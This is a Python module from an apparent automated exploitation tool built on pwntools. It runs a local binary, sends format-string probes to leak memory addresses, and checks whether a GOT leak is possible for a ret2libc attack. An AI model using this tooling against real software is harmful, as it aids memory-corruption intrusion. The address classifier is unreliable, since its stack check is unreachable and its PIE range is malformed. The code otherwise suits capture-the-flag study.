from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pwn import log, process

from autopwn.config import RECV_TIMEOUT

if TYPE_CHECKING:
    from autopwn.context import PwnContext


def verify_leak_points(ctx: PwnContext) -> list[dict]:
    """验证白盒分析发现的泄露点是否可用。

    对每个候选泄露点，实际运行程序确认能否泄露地址。
    """
    verified = []

    if not ctx.vulnerabilities:
        return verified

    for vuln in ctx.vulnerabilities:
        if isinstance(vuln, dict):
            vtype = vuln.get("type", "")
        else:
            vtype = getattr(vuln, "type", "")

        if vtype in ("fmt_string", "info_leak"):
            result = _try_leak(ctx, vuln)
            if result:
                verified.append(result)

    return verified


def _try_leak(ctx: PwnContext, vuln: dict) -> dict | None:
    """尝试利用一个漏洞泄露信息。"""
    try:
        p = process(ctx.binary_path, level="error")
        initial = p.recv(timeout=RECV_TIMEOUT)

        if isinstance(vuln, dict) and vuln.get("type") == "fmt_string":
            for i in range(1, 30):
                probe = f"%{i}$p".encode()
                try:
                    p.sendline(probe)
                    resp = p.recv(timeout=RECV_TIMEOUT)
                    addrs = _extract_hex_addrs(resp)
                    for addr in addrs:
                        addr_type = _classify_address(addr, ctx)
                        if addr_type:
                            p.close()
                            return {
                                "type": "fmt_leak",
                                "offset": i,
                                "addr": addr,
                                "addr_type": addr_type,
                                "confirmed": True,
                            }
                except Exception:
                    break

            p.close()
            return None

        p.close()
    except Exception:
        pass
    return None


def verify_got_leak(ctx: PwnContext, got_func: str, output_func: str = "puts") -> int | None:
    """验证通过output_func(GOT[got_func])能否泄露libc地址。

    这是ret2libc最常用的泄露方法。
    不实际执行exploit，只检查条件是否具备。
    """
    if not ctx.got_table:
        return None
    if got_func not in ctx.got_table:
        return None
    if output_func not in ctx.plt_table:
        return None

    got_addr = ctx.got_table[got_func]
    log.info(f"GOT泄露可用: {output_func}@plt -> {got_func}@got ({got_addr:#x})")
    return got_addr


def _extract_hex_addrs(data: bytes) -> list[int]:
    """从输出中提取十六进制地址。"""
    text = data.decode("utf-8", errors="replace")
    addrs = []

    for m in re.finditer(r"0x([0-9a-fA-F]{8,16})", text):
        try:
            addr = int(m.group(1), 16)
            if addr > 0x1000:
                addrs.append(addr)
        except ValueError:
            pass

    return addrs


def _classify_address(addr: int, ctx: PwnContext) -> str | None:
    """分类一个地址属于什么区域。"""
    if 0x7f0000000000 <= addr <= 0x7fffffffffff:
        if addr & 0xfff == 0:
            return "libc_base_candidate"
        return "libc"

    if 0x500000000000 <= addr <= 0x5fffffffffff:
        return "heap"

    if 0x7ffc00000000 <= addr <= 0x7fffffffffff:
        return "stack"

    if ctx.pie:
        if 0x550000000000 <= addr <= 0x56ffffffffffff:
            return "pie_binary"
    else:
        if 0x400000 <= addr <= 0x500000:
            return "binary"

    return None
